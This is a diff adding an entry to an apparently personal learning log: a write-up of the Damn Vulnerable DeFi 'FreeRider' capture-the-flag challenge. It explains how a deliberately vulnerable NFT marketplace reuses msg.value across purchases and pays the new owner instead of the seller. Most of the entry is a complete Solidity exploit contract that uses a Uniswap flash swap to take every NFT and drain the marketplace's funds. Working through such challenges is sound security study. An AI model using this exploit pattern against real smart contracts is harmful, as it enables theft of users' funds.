@@ -571,4 +571,101 @@ contract MyImplementation is ClimberVault{
 }
 ```
 
+### 2024.09.06
+
+- Damn Vulnerable DeFi: FreeRider
+
+#### FreeRider
+
+Issue:
+
+There are 2 main issues:
+1. fee check is inside _buyOne with msg.value
+   ```solidity
+       if (msg.value < priceToPay) {
+            revert InsufficientPayment();
+        }
+   ```
+2. seller payment sending to new owner
+   ```solidity
+       _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
+    
+       // pay seller using cached token
+       payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+   ```
+
+Solve:
+```solidity
+contract FreeRiderExploit{
+    WETH weth;
+    DamnValuableToken token;
+    IUniswapV2Factory uniswapV2Factory;
+    IUniswapV2Router02 uniswapV2Router;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    FreeRiderRecoveryManager recoveryManager;
+    address player;
+
+    uint256 constant NFT_PRICE = 15 ether;
+
+    constructor(
+        WETH _weth,
+        DamnValuableToken _token,
+        IUniswapV2Factory _uniswapV2Factory,
+        IUniswapV2Router02 _uniswapV2Router,
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager
+    ){
+        weth = _weth;
+        token = _token;
+        uniswapV2Factory = _uniswapV2Factory;
+        uniswapV2Router = _uniswapV2Router;
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        player = msg.sender;
+    }
+
+    function exploit() public{
+        uniswapPair.swap(NFT_PRICE, 0, address(this), "123");
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public{
+        
+        weth.withdraw(NFT_PRICE);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
+        }
+
+        console.log("*** balance: ", address(this).balance);
+
+        uint256 repay = NFT_PRICE * 1004 / 1000;
+        weth.deposit{value: repay}();
+        weth.transfer(address(uniswapPair), repay);
+
+    }
+    
+    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+```
+
+
+
+
 <!-- Content_END -->
